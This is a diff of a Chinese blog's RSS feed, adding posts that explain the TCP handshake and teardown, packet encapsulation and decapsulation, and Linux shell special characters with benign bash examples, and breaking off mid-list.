@@ -1,6 +1,1247 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SoulJian小站</title><link>https://souljian.cn/</link><description>Recent content on SoulJian小站</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 21 Apr 2025 12:59:27 +0800</lastBuildDate><atom:link href="https://souljian.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>FTP笑脸漏洞复现</title><link>https://souljian.cn/p/745211567/</link><pubDate>Mon, 21 Apr 2025 12:59:27 +0800</pubDate><guid>https://souljian.cn/p/745211567/</guid><description>&lt;p>&lt;strong>实验笔记：vsftpd 2.3.4 笑脸漏洞复现&lt;/strong>&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SoulJian小站</title><link>https://souljian.cn/</link><description>Recent content on SoulJian小站</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 21 Apr 2025 21:54:23 +0800</lastBuildDate><atom:link href="https://souljian.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>TCP三次握手和四次挥手</title><link>https://souljian.cn/p/745243663/</link><pubDate>Mon, 21 Apr 2025 21:54:23 +0800</pubDate><guid>https://souljian.cn/p/745243663/</guid><description>&lt;h3 id="-三次握手建立连接例子快递员确认收货地址">📦 &lt;strong>三次握手（建立连接）——例子：快递员确认收货地址&lt;/strong>
+&lt;/h3>&lt;p>假设你的浏览器（Chrome）是寄件人，服务器（Apache）是收件人，TCP协议（运输层）是快递公司，三次握手就像快递员上门确认地址的过程：&lt;/p>
+&lt;h4 id="1-第一次握手浏览器服务器">&lt;strong>1. 第一次握手（浏览器→服务器）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• 浏览器发送一个&lt;code>SYN=1&lt;/code>的包裹（SYN是同步序列号请求），并生成随机序号&lt;code>seq=1000&lt;/code>
+• 快递员（TCP）说：&amp;ldquo;您好，我是快递员，Chrome想给Apache寄包裹，您能收吗？&amp;rdquo;
+• &lt;strong>对应原图&lt;/strong>：
+• 左側运输层（蓝色）→网络层→链路层→物理层，通过N1/N2路由器传递到右侧服务器&lt;/p>
+&lt;h4 id="2-第二次握手服务器浏览器">&lt;strong>2. 第二次握手（服务器→浏览器）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• 服务器收到&lt;code>SYN&lt;/code>后，回复&lt;code>SYN=1 + ACK=1&lt;/code>，序号&lt;code>seq=2000&lt;/code>，确认号&lt;code>ack=1001&lt;/code>
+• 快递员反馈：&amp;ldquo;Apache确认能收件，请把包裹按编号1001开始发给我！&amp;rdquo;
+• &lt;strong>技术点&lt;/strong>：
+• &lt;code>ACK=1&lt;/code>表示确认收到第一次握手
+• &lt;code>ack=1001&lt;/code>表示&amp;quot;我期待收到下一个编号是1001的数据&amp;quot;&lt;/p>
+&lt;h4 id="3-第三次握手浏览器服务器">&lt;strong>3. 第三次握手（浏览器→服务器）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• 浏览器发送&lt;code>ACK=1&lt;/code>，序号&lt;code>seq=1001&lt;/code>，确认号&lt;code>ack=2001&lt;/code>
+• 快递员说：&amp;ldquo;好的，我会按您的要求开始寄送！&amp;rdquo;
+• &lt;strong>对应原图&lt;/strong>：
+• 运输层（蓝色）完成三次握手，应用层（橙色）正式开始传输网页数据&lt;/p>
+&lt;h4 id="-为什么必须三次">💡 &lt;strong>为什么必须三次？&lt;/strong>
+&lt;/h4>&lt;p>• 防止历史连接干扰：如果第一次握手的包裹卡在路由器（N1/N2）后又重复发送，服务器能通过第三次握手判断是否为过期请求
+• 类似快递员必须和双方确认地址，避免寄错地方&lt;/p>
+&lt;hr>
+&lt;h3 id="-四次挥手断开连接例子快递员确认包裹已全部送达">✋ &lt;strong>四次挥手（断开连接）——例子：快递员确认包裹已全部送达&lt;/strong>
+&lt;/h3>&lt;p>当数据传输完毕，TCP需要安全断开连接，就像快递员要确认双方都没有包裹需要寄送了：&lt;/p>
+&lt;h4 id="1-第一次挥手浏览器服务器">&lt;strong>1. 第一次挥手（浏览器→服务器）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• 浏览器发送&lt;code>FIN=1&lt;/code>（FIN是结束标志），序号&lt;code>seq=5000&lt;/code>
+• 快递员说：&amp;ldquo;Chrome的包裹都寄完了，准备收工啦！&amp;rdquo;&lt;/p>
+&lt;h4 id="2-第二次挥手服务器浏览器">&lt;strong>2. 第二次挥手（服务器→浏览器）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• 服务器回复&lt;code>ACK=1&lt;/code>，确认号&lt;code>ack=5001&lt;/code>
+• 快递员反馈：&amp;ldquo;好的，我收到你的收工通知了，但等我确认Apache还有没有包裹要寄给你&amp;rdquo;&lt;/p>
+&lt;h4 id="3-第三次挥手服务器浏览器">&lt;strong>3. 第三次挥手（服务器→浏览器）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• 服务器发送&lt;code>FIN=1&lt;/code>，序号&lt;code>seq=8000&lt;/code>
+• 快递员说：&amp;ldquo;Apache这边也没有包裹要寄了，可以收工！&amp;rdquo;&lt;/p>
+&lt;h4 id="4-第四次挥手浏览器服务器">&lt;strong>4. 第四次挥手（浏览器→服务器）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• 浏览器回复&lt;code>ACK=1&lt;/code>，确认号&lt;code>ack=8001&lt;/code>
+• 快递员确认：&amp;ldquo;双方都确认完毕，连接正式关闭！&amp;rdquo;&lt;/p>
+&lt;h4 id="-为什么挥手要四次">💡 &lt;strong>为什么挥手要四次？&lt;/strong>
+&lt;/h4>&lt;p>• 双向确认原则：浏览器和服务器各自独立关闭发送通道
+• 第一次挥手：浏览器关闭发送 → 第二次挥手：服务器确认
+• 第三次挥手：服务器关闭发送 → 第四次挥手：浏览器确认
+• 类似快递员要分别确认寄件人和收件人都没有包裹了&lt;/p>
+&lt;hr>
+&lt;h3 id="-结合原图的分层与流程">🌐 &lt;strong>结合原图的分层与流程&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>运输层专属&lt;/strong>：三次握手和四次挥手都发生在运输层（蓝色部分），应用层（橙色）无感知&lt;/li>
+&lt;li>&lt;strong>路由器N1/N2的作用&lt;/strong>：在网络层（绿色）传递握手/挥手的IP包，但不参与TCP逻辑&lt;/li>
+&lt;li>&lt;strong>可靠性保障&lt;/strong>：通过序号（seq）和确认号（ack），确保数据像快递包裹一样不丢失、不重复&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="-现实场景对照">🛠️ &lt;strong>现实场景对照&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>访问网站时&lt;/strong>：
+• 打开网页瞬间完成三次握手 → 传输数据 → 关闭标签页时触发四次挥手&lt;/li>
+&lt;li>&lt;strong>下载大文件时&lt;/strong>：
+• 握手后持续传输数据包 → 下载完成自动挥手断开&lt;/li>
+&lt;li>&lt;strong>网络卡顿时&lt;/strong>：
+• 握手失败会显示&amp;quot;连接超时&amp;quot;，挥手异常会导致端口长时间占用&lt;/li>
+&lt;/ol>
+&lt;hr></description></item><item><title>数据包解包过程</title><link>https://souljian.cn/p/745243566/</link><pubDate>Mon, 21 Apr 2025 21:52:46 +0800</pubDate><guid>https://souljian.cn/p/745243566/</guid><description>&lt;p>好的！我们结合原图用 &lt;strong>「拆快递」&lt;/strong> 的比喻来解释&lt;strong>解包过程&lt;/strong>，帮你把封包/解包的全流程对应到图中的每一层结构：&lt;/p>
+&lt;hr>
+&lt;h3 id="-解包过程详解对照原图的五层结构">📦 &lt;strong>解包过程详解（对照原图的五层结构）&lt;/strong>
+&lt;/h3>&lt;p>假设服务器收到你从Chrome发来的数据包（封包过程见前文），现在需要&lt;strong>从物理层到应用层逐层解包&lt;/strong>：&lt;/p>
+&lt;h4 id="1-物理层--数据链路层撕外层包装">&lt;strong>1. 物理层 → 数据链路层（撕外层包装）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• 服务器网卡收到光信号/电信号
+• 将信号转换为二进制数据流（&lt;code>011010...&lt;/code>）
+• &lt;strong>对应&lt;/strong>：
+•物理层接收信号，传递给右侧数据链路层&lt;/p>
+&lt;h4 id="2-数据链路层拆卡车运输箱">&lt;strong>2. 数据链路层（拆卡车运输箱）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• 检查数据帧的&lt;strong>MAC地址&lt;/strong>（类似核对卡车车牌号）
+• 剥离MAC头部，发现目的地是当前服务器
+• 如果MAC地址匹配，把数据包交给 网络层 ；不匹配则丢弃
+• &lt;strong>对应&lt;/strong>：
+• 据链路层剥离封装 → 网络层 开始工作&lt;/p>
+&lt;h4 id="3-网络层拆地址分拣标签">&lt;strong>3. 网络层（拆地址分拣标签）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• 检查IP头部，确认目的IP是&lt;code>10.20.1.100&lt;/code>（服务器自身IP）
+• 剥离IP头部，查看传输层协议类型（如TCP/UDP）
+• 如果IP不匹配且服务器是路由器，会重新转发（类似快递中转站）
+• &lt;strong>对应&lt;/strong>：
+•网络层剥离IP封装 → 运输层处理&lt;/p>
+&lt;h4 id="4-运输层拆快递小包裹">&lt;strong>4. 运输层（拆快递小包裹）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• TCP协议检查&lt;strong>端口号&lt;/strong>（比如目的端口&lt;code>80&lt;/code>对应Apache服务）
+• 检查数据包顺序号和校验和，若丢包则要求重发（类似快递员打电话让你补发丢失的箱子）
+• 重组被拆分的多个小包裹，恢复完整数据流
+• &lt;strong>对应&lt;/strong>：
+• 右侧运输层重组数据 → 应用层准备接收&lt;/p>
+&lt;h4 id="5-应用层拆最终包裹">&lt;strong>5. 应用层（拆最终包裹）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>动作&lt;/strong>：
+• Apache服务器解析HTTP请求内容（比如&amp;quot;请给我首页HTML&amp;quot;）
+• 生成响应数据（网页内容），开始反向封包过程（把包裹寄回浏览器）
+• &lt;strong>对应图示&lt;/strong>：
+• 右侧应用层的Apache进程处理请求，完成解包&lt;/p>
+&lt;hr>
+&lt;h3 id="-封包-vs-解包关键对比">🔄 &lt;strong>封包 vs 解包关键对比&lt;/strong>
+&lt;/h3>&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>&lt;strong>过程&lt;/strong>&lt;/th>
+&lt;th>&lt;strong>方向&lt;/strong>&lt;/th>
+&lt;th>&lt;strong>典型动作&lt;/strong>&lt;/th>
+&lt;th>&lt;strong>图示对应关系&lt;/strong>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>封包&lt;/td>
+&lt;td>从应用层→物理层&lt;/td>
+&lt;td>逐层&lt;strong>添加头部&lt;/strong>（如IP头、TCP头）&lt;/td>
+&lt;td>左側Chrome各层向下封装&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>解包&lt;/td>
+&lt;td>从物理层→应用层&lt;/td>
+&lt;td>逐层&lt;strong>剥离头部&lt;/strong>并校验&lt;/td>
+&lt;td>右側Apache各层向上解封装&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h3 id="-解包过程中的核心技术">💡 &lt;strong>解包过程中的核心技术&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>MAC地址过滤&lt;/strong>（数据链路层）：
+• 类似快递驿站只接收本小区快递，服务器会丢弃MAC地址不匹配的数据包&lt;/li>
+&lt;li>&lt;strong>IP地址验证&lt;/strong>（网络层）：
+• 服务器确认数据包是&amp;quot;寄给自己&amp;quot;的，否则执行转发或丢弃&lt;/li>
+&lt;li>&lt;strong>端口号映射&lt;/strong>（运输层）：
+• 通过目的端口&lt;code>80&lt;/code>，将数据交给Apache进程（类似快递员按门牌号送货）&lt;/li>
+&lt;li>&lt;strong>数据重组&lt;/strong>（运输层）：
+• 如果收到顺序错乱的包裹（如先收到编号3/3，再收到1/3），TCP会重新排序&lt;/li>
+&lt;li>&lt;strong>应用协议解析&lt;/strong>（应用层）：
+• Apache根据HTTP协议解析请求内容，理解用户想要什么网页&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="-结合原图的完整流程">🌐 &lt;strong>结合原图的完整流程&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>封包（Chrome→N1→N2→Apache）&lt;/strong> ：
+• 左側橙色（应用层）→蓝色→绿色→青色→深绿色，经N1/N2路由器传递&lt;/li>
+&lt;li>&lt;strong>解包（Apache←N2←N1←Chrome）&lt;/strong> ：
+• 右側深绿色（物理层）←青色←绿色←蓝色←橙色，逆向剥离每层封装&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="-为什么分层解包重要">🛠️ &lt;strong>为什么分层解包重要？&lt;/strong>
+&lt;/h3>&lt;p>• &lt;strong>错误隔离&lt;/strong>：如果物理层信号干扰（深绿色层），只需重传这一层数据，不影响上层
+• &lt;strong>高效处理&lt;/strong>：网络层（绿色）快速判断IP地址，无需解析全部数据
+• &lt;strong>灵活扩展&lt;/strong>：新增加密协议只需修改应用层（橙色），其他层保持不变&lt;/p>
+&lt;p>下次看到网络分层图时，可以想象数据包像&lt;strong>俄罗斯套娃&lt;/strong>，每一层都包裹着更核心的数据！ 🪆&lt;/p></description></item><item><title>数据包封装过程</title><link>https://souljian.cn/p/745243535/</link><pubDate>Mon, 21 Apr 2025 21:52:15 +0800</pubDate><guid>https://souljian.cn/p/745243535/</guid><description>&lt;p>我们以 &lt;strong>10网段私有IP地址&lt;/strong> 为例（比如你家/公司内网），重新还原整个过程，重点标注源IP和目的IP：&lt;/p>
+&lt;hr>
+&lt;h3 id="-快递运输过程10网段ip版">📦 &lt;strong>快递运输过程（10网段IP版）&lt;/strong>
+&lt;/h3>&lt;p>假设你的电脑IP是 &lt;code>10.0.0.2&lt;/code>，要访问公司内网的服务器IP &lt;code>10.20.1.100&lt;/code>，流程如下：&lt;/p>
+&lt;h4 id="1-应用层对话">&lt;strong>1. 应用层（对话）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>你的浏览器（Chrome）&lt;/strong>
+• 源IP：&lt;code>10.0.0.2&lt;/code>（你的电脑）
+• 目的IP：&lt;code>10.20.1.100&lt;/code>（公司服务器）
+• 请求内容：&amp;ldquo;请给我首页HTML文件&amp;rdquo;（写在快递单上的文字）&lt;/p>
+&lt;h4 id="2-运输层拆包贴标签">&lt;strong>2. 运输层（拆包+贴标签）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>TCP协议处理&lt;/strong>
+• 源端口：随机生成（比如&lt;code>54321&lt;/code>，你的浏览器门牌号）
+• 目的端口：&lt;code>80&lt;/code>（默认HTTP服务的门牌号）
+• 动作：把&amp;quot;首页请求&amp;quot;拆成多个小包裹，每个包裹标注顺序号（类似快递箱编号1/3、2/3、3/3）&lt;/p>
+&lt;h4 id="3-网络层找路">&lt;strong>3. 网络层（找路）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>路由器N1（你的网关）&lt;/strong>
+• 源IP：&lt;code>10.0.0.2&lt;/code>
+• 目的IP：&lt;code>10.20.1.100&lt;/code>
+• 查路由表：&amp;ldquo;去往&lt;code>10.20.0.0/16&lt;/code>网段，下一跳是路由器N2（IP &lt;code>10.0.0.1&lt;/code>）&amp;rdquo;
+• 类似快递分拣员：&amp;ldquo;这个包裹是10.20网段的，走3号通道到N2！&amp;rdquo;&lt;/p>
+&lt;h4 id="4-数据链路层卡车运输">&lt;strong>4. 数据链路层（卡车运输）&lt;/strong>
+&lt;/h4>&lt;p>• &lt;strong>从电脑到路由器N1&lt;/strong>
+• 源MAC地址：&lt;code>AA:BB:CC:DD:EE:01&lt;/code>（你的电脑网卡）
+• 目的MAC地址：&lt;code>AA:BB:CC:DD:EE:02&lt;/code>（路由器N1的接口）
+• 动作：通过网线/WiFi传输（卡车运输）&lt;/p>
+&lt;h4 id="5-物理层信号传输">&lt;strong>5. 物理层（信号传输）&lt;/strong>
+&lt;/h4>&lt;p>• 网线中的电信号或WiFi的无线电波，把二进制数据流（&lt;code>01101000...&lt;/code>）从电脑传到路由器N1。&lt;/p>
+&lt;hr>
+&lt;h3 id="-完整路径含ip">🌐 &lt;strong>完整路径（含IP）&lt;/strong>
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">你的电脑 (10.0.0.2) → 路由器N1 → 路由器N2 → 公司服务器 (10.20.1.100)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol>
+&lt;li>&lt;strong>应用层&lt;/strong>：浏览器发起请求 → 服务器返回网页&lt;/li>
+&lt;li>&lt;strong>运输层&lt;/strong>：TCP通过端口（源端口）&lt;code>54321→80&lt;/code>（目标端口）保证数据顺序&lt;/li>
+&lt;li>&lt;strong>网络层&lt;/strong>：IP地址（源IP）&lt;code>10.0.0.2→10.20.1.100&lt;/code>（目标IP）指引方向&lt;/li>
+&lt;li>&lt;strong>数据链路层&lt;/strong>：MAC地址逐段接力传输（每经过一个路由器，源/目的MAC都会改变）&lt;/li>
+&lt;li>&lt;strong>物理层&lt;/strong>：网线/WiFi承载光/电信号&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="-关键点">💡 &lt;strong>关键点&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>IP地址的作用&lt;/strong>：
+• 类似快递收件地址，网络层靠IP地址决定包裹往哪送
+• &lt;code>10.x.x.x&lt;/code>是私有IP（类似公司内部房间号），仅在局域网内使用&lt;/li>
+&lt;li>&lt;strong>MAC地址的作用&lt;/strong>：
+• 类似卡车车牌号，数据链路层靠MAC地址完成&amp;quot;最后一公里&amp;quot;配送
+• 每经过一个路由器（N1→N2），MAC地址都会更新，但IP地址始终不变&lt;/li>
+&lt;li>&lt;strong>为什么用10网段？&lt;/strong>
+• 私有IP地址（10.0.0.0~10.255.255.255）专用于内网
+• 避免和公网IP冲突，适合企业/家庭内部通信&lt;/li>
+&lt;/ol></description></item><item><title>Linux中特殊符号含义</title><link>https://souljian.cn/p/745241842/</link><pubDate>Mon, 21 Apr 2025 21:24:02 +0800</pubDate><guid>https://souljian.cn/p/745241842/</guid><description>&lt;h1 id="">
+&lt;/h1>&lt;h2 id="一特殊字符说明">一、特殊字符说明
+&lt;/h2>&lt;h3 id="一注释字符">（一）&lt;code>#&lt;/code>：注释字符
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：以 &lt;code>#&lt;/code> 开头的内容被视为注释，不会被执行。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This line is a comment.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">this_string&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;amazing alvin&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> awesome &lt;span class="si">${&lt;/span>&lt;span class="nv">this_string&lt;/span>&lt;span class="p">#amazing&lt;/span>&lt;span class="si">}&lt;/span> &lt;span class="c1"># 输出去掉 &amp;#34;amazing&amp;#34; 的字符串&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$this_string&lt;/span> &lt;span class="c1"># 输出原始字符串&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>用途&lt;/strong>：用于在脚本中添加说明或临时禁用某些命令。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="二代表用户的-home-目录">（二）&lt;code>~&lt;/code>：代表用户的 home 目录
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：&lt;code>~&lt;/code> 表示当前用户的家目录。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ~ &lt;span class="c1"># 返回当前用户的家目录&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ~/Documents &lt;span class="c1"># 进入家目录下的 Documents 文件夹&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>用途&lt;/strong>：快速定位到用户的家目录或其子目录。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="三分号连续指令">（三）&lt;code>;&lt;/code>：分号（连续指令）
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：分隔多个命令，即使前面的命令失败，后面的命令也会继续执行。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls &amp;gt; count.txt&lt;span class="p">;&lt;/span> wc -l count.txt&lt;span class="p">;&lt;/span> rm count.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>用途&lt;/strong>：在一行中执行多个命令。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="四路径分隔符">（四）&lt;code>/&lt;/code>：路径分隔符
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：用于分隔路径中的目录和文件名，&lt;code>/&lt;/code> 也表示根目录。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /usr/local/bin
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>用途&lt;/strong>：表示路径或切换到根目录。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="五转义符">（五）&lt;code>\&lt;/code>：转义符
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>取消特殊字符的功能。&lt;/li>
+&lt;li>连接多行命令。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="se">\r&lt;/span>m file.txt &lt;span class="c1"># 取消 rm 的别名&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Backup dir, \$bkdir = &lt;/span>&lt;span class="nv">$bkdir&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="c1"># 输出 $bkdir 而非变量内容&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>用途&lt;/strong>：用于转义特殊字符或分割长命令。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="六管道符">（六）&lt;code>|&lt;/code>：管道符
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：将一个命令的输出作为下一个命令的输入。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">who &lt;span class="p">|&lt;/span> wc -l &lt;span class="c1"># 统计当前登录用户数量&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>用途&lt;/strong>：连接多个命令，实现复杂的数据处理。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="七当前目录">（七）&lt;code>.&lt;/code>：当前目录
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：表示当前目录。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./script.sh &lt;span class="c1"># 执行当前目录下的 script.sh 脚本&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>用途&lt;/strong>：指定当前目录下的文件或脚本。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="八父目录">（八）&lt;code>..&lt;/code>：父目录
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：表示当前目录的上一级目录。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> .. &lt;span class="c1"># 返回上一级目录&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
